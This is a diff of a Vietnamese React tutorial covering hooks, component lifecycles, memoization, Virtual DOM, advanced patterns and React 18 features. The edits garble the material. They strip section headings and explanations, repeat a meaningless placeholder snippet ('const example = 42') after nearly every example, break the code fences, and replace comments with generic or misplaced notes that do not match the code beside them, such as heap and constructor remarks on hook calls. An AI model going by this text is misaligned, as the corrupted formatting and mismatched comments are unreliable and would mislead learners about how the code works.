       ? (todos.filter(t => t.done).length / todos.length * 100).toFixed(1)
       : '0'
   }), [todos]);
-  
+
   return (
     <div>
       <p>Total: {stats.total}</p>
@@ -11511,11 +5086,13 @@ function TodoList({ todos }) {
     </div>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Khi KHÔNG nên dùng useMemo:**
-
-```typescript
+typescript
  // Heap lưu object và mảng; được runtime quản lý bởi trình thu gom rác.
 const doubled = useMemo(() => count * 2, [count]);
  // Chú giải: ✅ Just compute directly
@@ -11534,18 +5111,13 @@ const data = useMemo(() => transform(props.data), [props.data]);
 // - Có performance issue đo được (React DevTools Profiler)
  // Chú giải: - Computation thực sự expensive (>10ms)
  // Chú giải: - Prevent child re-renders (với React.memo)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.8. useCallback - Memoized Function Hook**
-
-**🎯 Mục đích:**
-Cache function reference, tránh re-create function mỗi render (optimization cho child components).
-
-**📖 useCallback vs useMemo:**
-
-```typescript
+typescript
  // Chú giải: useCallback: Memoize FUNCTION
 const memoizedCallback = useCallback(() => {
   doSomething(a, b);
@@ -11558,11 +5130,13 @@ const memoizedCallback = useMemo(() => {
 
  // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
 const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: BASIC USAGE
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -11570,17 +5144,17 @@ const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);
 function Parent() {
   const [count, setCount] = useState(0);
   const [name, setName] = useState('');
-  
+
  // Chú giải: ❌ New function mỗi render → Child re-render
   const handleClick = () => {
     console.log('Clicked');
   };
-  
+
   // ✅ Stable reference → Child không re-render
   const handleClick = useCallback(() => {
     console.log('Clicked');
   }, []); // Chú giải: No deps = never re-create
-  
+
   return (
     <>
       <input value={name} onChange={e => setName(e.target.value)} />
@@ -11601,23 +5175,23 @@ const Child = React.memo(({ onClick }) => {
 function SearchBox() {
   const [query, setQuery] = useState('');
   const [results, setResults] = useState([]);
-  
+
   // Function re-create khi query thay đổi
   const handleSearch = useCallback(async () => {
     const data = await fetch(`/api/search?q=${query}`);
     setResults(await data.json());
   }, [query]); // Chú giải: Dependency: query
-  
+
  // Chú giải: Debounced version
   const debouncedSearch = useCallback(
     debounce(handleSearch, 300),
     [handleSearch]
   );
-  
+
   return (
     <div>
-      <input 
-        value={query} 
+      <input
+        value={query}
         onChange={e => setQuery(e.target.value)}
       />
       <button onClick={handleSearch}>Search</button>
@@ -11633,16 +5207,16 @@ function TodoItem({ todo, onToggle, onDelete }) {
   // ❌ Tạo function mới mỗi render (nếu không memo)
   const handleToggle = () => onToggle(todo.id);
   const handleDelete = () => onDelete(todo.id);
-  
+
   // ✅ Stable references (nếu parent truyền memoized callbacks)
   const handleToggle = useCallback(() => {
     onToggle(todo.id);
   }, [todo.id, onToggle]);
-  
+
   const handleDelete = useCallback(() => {
     onDelete(todo.id);
   }, [todo.id, onDelete]);
-  
+
   return (
     <li>
       <input type="checkbox" onChange={handleToggle} />
@@ -11658,12 +5232,12 @@ function TodoItem({ todo, onToggle, onDelete }) {
 
 function useDebounce(callback, delay, deps) {
   const timeoutRef = useRef(null);
-  
+
   return useCallback((...args) => {
     if (timeoutRef.current) {
       clearTimeout(timeoutRef.current);
     }
-    
+
     timeoutRef.current = setTimeout(() => {
       callback(...args);
     }, delay);
@@ -11673,15 +5247,15 @@ function useDebounce(callback, delay, deps) {
  // Chú giải: Usage
 function Search() {
   const [query, setQuery] = useState('');
-  
+
   const search = useCallback((q) => {
     console.log('Searching for:', q);
   }, []);
-  
+
   const debouncedSearch = useDebounce(search, 500, []);
-  
+
   return (
-    <input 
+    <input
       value={query}
       onChange={e => {
         setQuery(e.target.value);
@@ -11690,11 +5264,13 @@ function Search() {
     />
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Common Mistakes:**
-
-```typescript
+typescript
 // ❌ 1. useCallback without React.memo (vô ích)
 function Parent() {
   const handleClick = useCallback(() => {}, []); // Vô ích vì Child không memo!
@@ -11729,23 +5305,13 @@ const handleClick = useCallback(() => {
 const handleClick = () => {
   setCount(c => c + 1);
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.9. useImperativeHandle - Customize Ref Exposure**
-
-**🎯 Mục đích:**
-Customize giá trị exposed qua ref từ child component (advanced pattern, ít dùng).
-
-**📖 Khi nào dùng:**
-- Expose specific methods từ child (thay vì toàn bộ DOM node)
-- Tạo reusable components với imperative API
-- Integration với third-party libraries
-
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: BASIC PATTERN
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -11758,7 +5324,7 @@ type InputHandle = {
 const CustomInput = forwardRef<InputHandle, { placeholder?: string }>(
   (props, ref) => {
     const inputRef = useRef<HTMLInputElement>(null);
-    
+
     // Expose custom methods thay vì DOM node
     useImperativeHandle(ref, () => ({
       focus: () => {
@@ -11770,7 +5336,7 @@ const CustomInput = forwardRef<InputHandle, { placeholder?: string }>(
         }
       }
     }), []); // Deps: re-create methods khi deps thay đổi
-    
+
     return <input ref={inputRef} placeholder={props.placeholder} />;
   }
 );
@@ -11778,7 +5344,7 @@ const CustomInput = forwardRef<InputHandle, { placeholder?: string }>(
  // Chú giải: Usage
 function Parent() {
   const inputRef = useRef<InputHandle>(null);
-  
+
   return (
     <>
       <CustomInput ref={inputRef} />
@@ -11803,7 +5369,7 @@ const Form = forwardRef<FormHandle, { onSubmit: (data: any) => void }>(
   ({ onSubmit }, ref) => {
     const [values, setValues] = useState({});
     const [errors, setErrors] = useState({});
-    
+
     const validate = useCallback(() => {
  // Chú giải: Validation logic
       const newErrors = {};
@@ -11811,7 +5377,7 @@ const Form = forwardRef<FormHandle, { onSubmit: (data: any) => void }>(
       setErrors(newErrors);
       return Object.keys(newErrors).length === 0;
     }, [values]);
-    
+
     useImperativeHandle(ref, () => ({
       submit: () => {
         if (validate()) {
@@ -11825,7 +5391,7 @@ const Form = forwardRef<FormHandle, { onSubmit: (data: any) => void }>(
       validate,
       getValues: () => values
     }), [values, validate, onSubmit]);
-    
+
     return (
       <form>
         {/* Form fields */}
@@ -11837,7 +5403,7 @@ const Form = forwardRef<FormHandle, { onSubmit: (data: any) => void }>(
  // Chú giải: Usage
 function Parent() {
   const formRef = useRef<FormHandle>(null);
-  
+
   return (
     <>
       <Form ref={formRef} onSubmit={console.log} />
@@ -11846,11 +5412,13 @@ function Parent() {
     </>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Best Practices:**
-
-```typescript
+typescript
  // Chú giải: ❌ Don't expose entire DOM node
 useImperativeHandle(ref, () => inputRef.current);
 
@@ -11866,23 +5434,13 @@ useImperativeHandle(ref, () => ({
 <Input autoFocus onClear={handleClear} /> // Chú giải: Declarative
 vs
 inputRef.current.focus(); // Chú giải: Imperative
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.10. useSyncExternalStore - Sync with External Store**
-
-**🎯 Mục đích:**
-Subscribe to external stores (Redux, Zustand, browser APIs) một cách an toàn với React 18+ concurrent rendering.
-
-**📖 Tại sao cần hook này:**
-- React 18+ có concurrent rendering → có thể render nhiều lần trước commit
-- External stores (không phải React state) có thể thay đổi giữa các lần render
-- useSyncExternalStore đảm bảo consistency
-
-**💡 Chi tiết kỹ thuật:**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: BASIC PATTERN
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -11890,16 +5448,16 @@ Subscribe to external stores (Redux, Zustand, browser APIs) một cách an toàn
 const store = {
   listeners: new Set(),
   state: { count: 0 },
-  
+
   subscribe(listener) {
     this.listeners.add(listener);
     return () => this.listeners.delete(listener);
   },
-  
+
   getSnapshot() {
     return this.state;
   },
-  
+
   increment() {
     this.state = { count: this.state.count + 1 };
     this.listeners.forEach(listener => listener());
@@ -11911,7 +5469,7 @@ function Counter() {
     store.subscribe.bind(store), // Chú giải: subscribe function
     store.getSnapshot.bind(store) // Chú giải: getSnapshot function
   );
-  
+
   return (
     <div>
       <p>Count: {state.count}</p>
@@ -11972,30 +5530,21 @@ const useStore = create((set) => ({
 function Counter() {
   const count = useStore(state => state.count);
   const increment = useStore(state => state.increment);
-  
+
   return <button onClick={increment}>{count}</button>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Note:**
-- Hầu hết developers KHÔNG cần dùng trực tiếp
-- Libraries (Redux, Zustand, Jotai) đã integrate internally
-- Chỉ cần khi build custom state management library
-
----
-
-#### **📚 PHẦN 2: LIFECYCLE - CLASS VS FUNCTIONAL COMPONENTS**
-
----
-
-##### **2.1. Class Component Lifecycle**
-
-```typescript
+typescript
 class MyComponent extends React.Component {
  // Chú giải: ══════════════════════════════════════════════════════════
   // MOUNTING PHASE (Component được tạo và thêm vào DOM)
  // Chú giải: ══════════════════════════════════════════════════════════
-  
+
   constructor(props) {
     super(props);
  // Chú giải: 1. Khởi tạo state
@@ -12005,7 +5554,7 @@ class MyComponent extends React.Component {
     // ⚠️ KHÔNG gọi setState() ở đây!
     // ⚠️ KHÔNG có side effects (API calls, subscriptions)
   }
-  
+
   static getDerivedStateFromProps(props, state) {
     // 2. Sync state với props (HIẾM khi dùng)
  // Chú giải: Chạy TRƯỚC mỗi render (mount + update)
@@ -12015,7 +5564,7 @@ class MyComponent extends React.Component {
     }
     return null;
   }
-  
+
   componentDidMount() {
     // 3. Component đã mount vào DOM
  // Chú giải: ✅ PERFECT cho:
@@ -12023,66 +5572,66 @@ class MyComponent extends React.Component {
  // Chú giải: - Subscriptions (WebSocket, EventEmitter)
  // Chú giải: - DOM manipulation
  // Chú giải: - Setup timers/intervals
-    
+
  // Chú giải: Example:
     fetch('/api/data')
       .then(res => res.json())
       .then(data => this.setState({ data }));
-    
+
     this.timer = setInterval(() => {
       this.setState({ time: new Date() });
     }, 1000);
-    
+
     document.addEventListener('click', this.handleClick);
   }
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
   // UPDATING PHASE (Props hoặc State thay đổi)
  // Chú giải: ══════════════════════════════════════════════════════════
-  
+
   shouldComponentUpdate(nextProps, nextState) {
     // 4. Quyết định có render lại không (performance optimization)
  // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
     // ⚠️ PureComponent tự động implement shallow comparison
-    
-    return nextProps.id !== this.props.id || 
+
+    return nextProps.id !== this.props.id ||
            nextState.count !== this.state.count;
   }
-  
+
   getSnapshotBeforeUpdate(prevProps, prevState) {
     // 5. Capture DOM info TRƯỚC khi update (HIẾM dùng)
     // Return value → pass vào componentDidUpdate
-    
+
  // Chú giải: Example: Preserve scroll position
     if (prevProps.list.length < this.props.list.length) {
       return this.listRef.scrollHeight;
     }
     return null;
   }
-  
+
   componentDidUpdate(prevProps, prevState, snapshot) {
     // 6. Component đã re-render
  // Chú giải: ✅ PERFECT cho:
     // - Fetch data khi props thay đổi
  // Chú giải: - DOM manipulation based on changes
  // Chú giải: - Update third-party libraries
-    
+
     // ⚠️ MUST so sánh props/state trước khi setState (tránh infinite loop!)
     if (this.props.userId !== prevProps.userId) {
       this.fetchUser(this.props.userId);
     }
-    
+
  // Chú giải: Use snapshot from getSnapshotBeforeUpdate
     if (snapshot !== null) {
-      this.listRef.scrollTop = 
+      this.listRef.scrollTop =
         this.listRef.scrollHeight - snapshot;
     }
   }
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: UNMOUNTING PHASE (Component bị remove khỏi DOM)
  // Chú giải: ══════════════════════════════════════════════════════════
-  
+
   componentWillUnmount() {
  // Chú giải: 7. Cleanup trước khi unmount
     // ✅ REQUIRED để tránh memory leaks:
@@ -12090,42 +5639,43 @@ class MyComponent extends React.Component {
  // Chú giải: - Cancel network requests
  // Chú giải: - Unsubscribe
  // Chú giải: - Remove event listeners
-    
+
     clearInterval(this.timer);
     document.removeEventListener('click', this.handleClick);
     this.subscription.unsubscribe();
   }
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: ERROR HANDLING
  // Chú giải: ══════════════════════════════════════════════════════════
-  
+
   static getDerivedStateFromError(error) {
     // 8. Update state khi có error
     return { hasError: true };
   }
-  
+
   componentDidCatch(error, errorInfo) {
  // Chú giải: 9. Log error info
     logErrorToService(error, errorInfo);
   }
-  
+
   render() {
  // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
     // ⚠️ KHÔNG setState, side effects ở đây!
     return <div>{this.state.count}</div>;
   }
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📊 Lifecycle Diagram:**
-
-```
 MOUNTING:
 constructor → getDerivedStateFromProps → render → componentDidMount
 
 UPDATING (props/state change):
-getDerivedStateFromProps → shouldComponentUpdate → render → 
+getDerivedStateFromProps → shouldComponentUpdate → render →
 getSnapshotBeforeUpdate → componentDidUpdate
 
 UNMOUNTING:
@@ -12133,52 +5683,52 @@ componentWillUnmount
 
 ERROR:
 getDerivedStateFromError → componentDidCatch
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **2.2. Functional Component Lifecycle (với Hooks)**
-
-```typescript
+typescript
 function MyComponent(props) {
  // Chú giải: ══════════════════════════════════════════════════════════
  // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
  // Chú giải: ══════════════════════════════════════════════════════════
   const [count, setCount] = useState(0);
   const [data, setData] = useState(null);
-  
+
  // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
   const [expensiveState, setExpensiveState] = useState(() => {
     return computeExpensiveValue();
   });
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: EQUIVALENT TO: getDerivedStateFromProps
  // Chú giải: ══════════════════════════════════════════════════════════
   // ❌ Không cần! Chỉ compute trong render
   const derivedValue = props.value * 2;
-  
+
   // Hoặc nếu cần sync với state:
   const [value, setValue] = useState(props.initialValue);
   useEffect(() => {
     setValue(props.initialValue);
   }, [props.initialValue]);
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: EQUIVALENT TO: componentDidMount
  // Chú giải: ══════════════════════════════════════════════════════════
   useEffect(() => {
  // Chú giải: Chạy SAU first render
     console.log('Mounted');
-    
+
     fetch('/api/data')
       .then(res => res.json())
       .then(setData);
-    
+
     const timer = setInterval(() => {}, 1000);
-    
+
     document.addEventListener('click', handleClick);
-    
+
  // Chú giải: EQUIVALENT TO: componentWillUnmount
     return () => {
       console.log('Unmounted');
@@ -12186,7 +5736,7 @@ function MyComponent(props) {
       document.removeEventListener('click', handleClick);
     };
   }, []); // Chú giải: Empty deps = chỉ chạy khi mount/unmount
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: EQUIVALENT TO: componentDidUpdate (specific value)
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -12195,7 +5745,7 @@ function MyComponent(props) {
     console.log('userId changed:', props.userId);
     fetchUser(props.userId);
   }, [props.userId]); // Chú giải: Dependency: userId
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: EQUIVALENT TO: componentDidUpdate (every render)
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -12203,7 +5753,7 @@ function MyComponent(props) {
  // Chú giải: Chạy SAU mỗi render
     console.log('Component updated');
   }); // Chú giải: No deps = chạy mỗi render
-  
+
  // Chú giải: Track previous value (like prevProps/prevState)
   const prevCount = usePrevious(count);
   useEffect(() => {
@@ -12211,13 +5761,13 @@ function MyComponent(props) {
       console.log(`Count changed from ${prevCount} to ${count}`);
     }
   }, [count, prevCount]);
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: EQUIVALENT TO: shouldComponentUpdate
  // Chú giải: ══════════════════════════════════════════════════════════
   // Dùng React.memo thay vì hook
   // (xem phần React.memo bên dưới)
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: EQUIVALENT TO: getSnapshotBeforeUpdate
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -12226,7 +5776,7 @@ function MyComponent(props) {
     const snapshot = listRef.current.scrollHeight;
  // Chú giải: Update DOM synchronously
   }, [list]);
-  
+
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: RENDER
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -12238,38 +5788,13 @@ export default React.memo(MyComponent, (prevProps, nextProps) => {
  // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
   return prevProps.id === nextProps.id;
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📊 So sánh Class vs Functional:**
-
-| Class Component | Functional Component |
-|----------------|---------------------|
-| `constructor` | `useState(() => initialValue)` |
-| `componentDidMount` | `useEffect(() => {}, [])` |
-| `componentDidUpdate` | `useEffect(() => {}, [deps])` |
-| `componentWillUnmount` | `useEffect(() => { return cleanup }, [])` |
-| `shouldComponentUpdate` | `React.memo(Component, areEqual)` |
-| `getDerivedStateFromProps` | Compute trong render hoặc `useEffect` |
-| `getSnapshotBeforeUpdate` | `useLayoutEffect` |
-| `componentDidCatch` | Chưa có hook (dùng Error Boundary class) |
-
----
-
-#### **📚 PHẦN 3: VIRTUAL DOM & PERFORMANCE**
-
----
-
-##### **3.1. Virtual DOM & Reconciliation**
-
-**🎯 Virtual DOM là gì:**
-- JavaScript object đại diện cho Real DOM
-- React tạo Virtual DOM tree mỗi khi state/props thay đổi
-- So sánh (diffing) old Virtual DOM vs new Virtual DOM
-- Chỉ update những thay đổi thực sự lên Real DOM
-
-**📖 Reconciliation Process:**
-
-```typescript
+typescript
  // Chú giải: 1. Initial render
 const vdom = { type: 'div', props: { className: 'box' }, children: ['Hello'] };
  // Chú giải: → React tạo real DOM: <div class="box">Hello</div>
@@ -12287,11 +5812,13 @@ const newVdom = { type: 'div', props: { className: 'box' }, children: ['World'] 
 
  // Chú giải: 5. Commit phase: Update real DOM
 element.textContent = 'World'; // Chỉ update text, không re-create div
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**💡 Key trong Lists - TẠI SAO QUAN TRỌNG:**
-
-```typescript
+typescript
 // ❌ KHÔNG DÙNG INDEX làm key
 {items.map((item, index) => <Item key={index} data={item} />)}
 // Problem: Khi thêm/xóa item → index thay đổi → React re-render sai items
@@ -12304,20 +5831,13 @@ element.textContent = 'World'; // Chỉ update text, không re-create div
 // ✅ DÙNG STABLE UNIQUE ID
 {items.map(item => <Item key={item.id} data={item} />)}
 // React biết chính xác item nào added/removed/moved
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**⚠️ Khi nào được dùng index:**
-- List KHÔNG bao giờ thay đổi order (static)
-- Không có filter/sort
-- Items không có unique ID
-
----
-
-##### **3.2. PureComponent vs React.memo**
-
-**🎯 PureComponent (Class):**
-
-```typescript
+typescript
  // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
 class MyComponent extends React.PureComponent {
   render() {
@@ -12328,7 +5848,7 @@ class MyComponent extends React.PureComponent {
  // Chú giải: Equivalent to:
 class MyComponent extends React.Component {
   shouldComponentUpdate(nextProps, nextState) {
-    return !shallowEqual(this.props, nextProps) || 
+    return !shallowEqual(this.props, nextProps) ||
            !shallowEqual(this.state, nextState);
   }
 }
@@ -12336,11 +5856,13 @@ class MyComponent extends React.Component {
  // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
 // { a: 1 } !== { a: 1 } → re-render (mặc dù giống nhau)
  // Chú giải: [1,2,3] !== [1,2,3] → re-render
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 React.memo (Functional):**
-
-```typescript
+typescript
  // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
 const MyComponent = React.memo(({ name, age }) => {
   return <div>{name} - {age}</div>;
@@ -12358,11 +5880,11 @@ const MyComponent = React.memo(
 function Parent() {
   const [count, setCount] = useState(0);
   const [name, setName] = useState('');
-  
+
  // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
   const config = useMemo(() => ({ theme: 'dark' }), []);
   const handleClick = useCallback(() => {}, []);
-  
+
   return (
     <>
       <input value={name} onChange={e => setName(e.target.value)} />
@@ -12375,15 +5897,13 @@ const Child = React.memo(({ config, onClick }) => {
   console.log('Child rendered');
   return <button onClick={onClick}>{config.theme}</button>;
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **3.3. state vs props & Parent/Child Re-rendering**
-
-**📖 state vs props:**
-
-```typescript
+typescript
  // Mutable (có thể thay đổi): thuộc tính object hoặc phần tử mảng có thể bị sửa trực tiếp; nếu cần bất biến, dùng `Object.freeze()` (chỉ nông) hoặc pattern/ thư viện bất biến.
 const [count, setCount] = useState(0); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
 
@@ -12398,11 +5918,13 @@ function Parent() {
   const [count, setCount] = useState(0);
   return <Child count={count} />; // Chú giải: Pass state as props
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📖 Parent re-render → Child re-render?**
-
-```typescript
+typescript
  // Chú giải: ✅ YES: Default behavior
 function Parent() {
   const [count, setCount] = useState(0);
@@ -12441,17 +5963,13 @@ function Parent() {
   const child = useMemo(() => <Child />, []); // Chú giải: Cache element
   return <div>{child}</div>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 PHẦN 4: ADVANCED PATTERNS**
-
----
-
-##### **4.1. Higher-Order Components (HOC)**
-
-```typescript
+typescript
  // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
 function withLoading(Component) {
   return function WithLoadingComponent({ isLoading, ...props }) {
@@ -12472,30 +5990,30 @@ function withAuth(Component) {
     return <Component {...props} user={user} />;
   };
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **4.2. Render Props**
-
-```typescript
+typescript
  // Chú giải: Component với function as child
 function DataFetcher({ url, render }) {
   const [data, setData] = useState(null);
   const [loading, setLoading] = useState(true);
-  
+
   useEffect(() => {
     fetch(url).then(res => res.json()).then(data => {
       setData(data);
       setLoading(false);
     });
   }, [url]);
-  
+
   return render({ data, loading });
 }
 
  // Chú giải: Usage
-<DataFetcher 
+<DataFetcher
   url="/api/users"
   render={({ data, loading }) => (
     loading ? <Spinner /> : <UserList users={data} />
@@ -12515,13 +6033,13 @@ function UserList() {
   if (loading) return <Spinner />;
   return <ul>{data.map(user => <li key={user.id}>{user.name}</li>)}</ul>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **4.3. Compound Components**
-
-```typescript
+typescript
 // Components hoạt động cùng nhau qua Context
 const TabsContext = createContext();
 
@@ -12541,7 +6059,7 @@ function TabList({ children }) {
 function Tab({ id, children }) {
   const { activeTab, setActiveTab } = useContext(TabsContext);
   return (
-    <button 
+    <button
       className={activeTab === id ? 'active' : ''}
       onClick={() => setActiveTab(id)}
     >
@@ -12564,17 +6082,13 @@ function TabPanel({ id, children }) {
   <TabPanel id="home">Home content</TabPanel>
   <TabPanel id="profile">Profile content</TabPanel>
 </Tabs>
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 PHẦN 5: REACT FEATURES**
-
----
-
-##### **5.1. React Batching (Automatic in React 18+)**
-
-```typescript
+typescript
  // Chú giải: React 17: Chỉ batch trong event handlers
 function handleClick() {
   setCount(c => c + 1);
@@ -12602,13 +6116,13 @@ flushSync(() => {
   setCount(c => c + 1);
 }); // Chú giải: Render immediately
 setFlag(f => !f); // Chú giải: Render again
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **5.2. Code Splitting & Lazy Loading**
-
-```typescript
+typescript
  // Chú giải: Route-based splitting
 const Home = lazy(() => import('./Home'));
 const About = lazy(() => import('./About'));
@@ -12642,20 +6156,20 @@ function Dashboard() {
 }
 
  // Chú giải: Named exports
-const { TabPanel } = lazy(() => 
+const { TabPanel } = lazy(() =>
   import('./Tabs').then(module => ({ default: module.TabPanel }))
 );
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **5.3. React Portal**
-
-```typescript
+typescript
 // Render children vào DOM node khác (ngoài parent hierarchy)
 function Modal({ children, isOpen }) {
   if (!isOpen) return null;
-  
+
   return createPortal(
     <div className="modal-overlay">
       <div className="modal">{children}</div>
@@ -12674,25 +6188,25 @@ function Modal({ children, isOpen }) {
  // Chú giải: - Modals, Dialogs
  // Chú giải: - Tooltips, Popovers
  // Chú giải: - Notifications (toast)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **5.4. Error Boundaries**
-
-```typescript
+typescript
 // Chỉ có thể dùng Class Component (chưa có hook)
 class ErrorBoundary extends React.Component {
   state = { hasError: false, error: null };
-  
+
   static getDerivedStateFromError(error) {
     return { hasError: true, error };
   }
-  
+
   componentDidCatch(error, errorInfo) {
     logErrorToService(error, errorInfo);
   }
-  
+
   render() {
     if (this.state.hasError) {
       return <ErrorFallback error={this.state.error} />;
@@ -12711,17 +6225,13 @@ class ErrorBoundary extends React.Component {
  // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý. `setTimeout`/`setInterval` nằm trong macrotasks; nhớ clear khi không cần để tránh rò rỉ bộ nhớ.
  // Chú giải: - Server-side rendering
  // Chú giải: - Errors trong Error Boundary itself
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 PHẦN 6: REACT 18+ FEATURES**
-
----
-
-##### **6.1. Suspense for Data Fetching**
-
-```typescript
+typescript
  // Chú giải: Suspense-enabled data fetching
 const resource = fetchData('/api/users'); // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
 
@@ -12739,13 +6249,13 @@ function App() {
 }
 
  // Chú giải: Libraries hỗ trợ: React Query, SWR, Relay
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **6.2. Server Components (React 18+)**
-
-```typescript
+typescript
  // Chú giải: Server Component (.server.jsx)
 async function UserProfile({ userId }) {
   const user = await db.users.findById(userId); // Chú giải: Direct DB access!
@@ -12763,26 +6273,26 @@ function Counter() {
 // - Zero bundle size (server components không ship JS)
  // Chú giải: - Direct backend access (DB, filesystem)
  // Chú giải: - Automatic code splitting
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **6.3. Concurrent Rendering - useTransition & useDeferredValue**
-
-```typescript
+typescript
  // Chú giải: useTransition: Mark updates as non-urgent
 function SearchBox() {
   const [query, setQuery] = useState('');
   const [isPending, startTransition] = useTransition();
-  
+
   const handleChange = (e) => {
     setQuery(e.target.value); // Chú giải: Urgent: update input
-    
+
     startTransition(() => {
       setSearchResults(e.target.value); // Chú giải: Non-urgent: can interrupt
     });
   };
-  
+
   return (
     <>
       <input value={query} onChange={handleChange} />
@@ -12796,7 +6306,7 @@ function SearchBox() {
 function App() {
   const [text, setText] = useState('');
   const deferredText = useDeferredValue(text); // Chú giải: Lags behind
-  
+
   return (
     <>
       <input value={text} onChange={e => setText(e.target.value)} />
@@ -12804,13 +6314,13 @@ function App() {
     </>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **6.4. Hydration (SSR/Next.js)**
-
-```typescript
+typescript
  // Chú giải: Server-side: Generate HTML
 const html = renderToString(<App />);
  // Chú giải: Send HTML to client → User sees content immediately
@@ -12823,17 +6333,13 @@ hydrateRoot(document.getElementById('root'), <App />);
   <Comments /> {/* Hydrate sau khi ready */}
 </Suspense>
 // User có thể interact với page khác ngay lập tức
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 PHẦN 7: ROUTING & MISC**
-
----
-
-##### **7.1. React Router**
-
-```typescript
+typescript
 import { BrowserRouter, Routes, Route, Link, useParams, useNavigate } from 'react-router-dom';
 
 function App() {
@@ -12844,7 +6350,7 @@ function App() {
         <Link to="/about">About</Link>
         <Link to="/users/123">User 123</Link>
       </nav>
-      
+
       <Routes>
         <Route path="/" element={<Home />} />
         <Route path="/about" element={<About />} />
@@ -12858,7 +6364,7 @@ function App() {
 function User() {
   const { id } = useParams(); // Chú giải: Get URL params
   const navigate = useNavigate(); // Chú giải: Programmatic navigation
-  
+
   return (
     <>
       <h1>User {id}</h1>
@@ -12866,13 +6372,13 @@ function User() {
     </>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **7.2. Fragments**
-
-```typescript
+typescript
  // Chú giải: Avoid extra DOM nodes
 function List() {
   return (
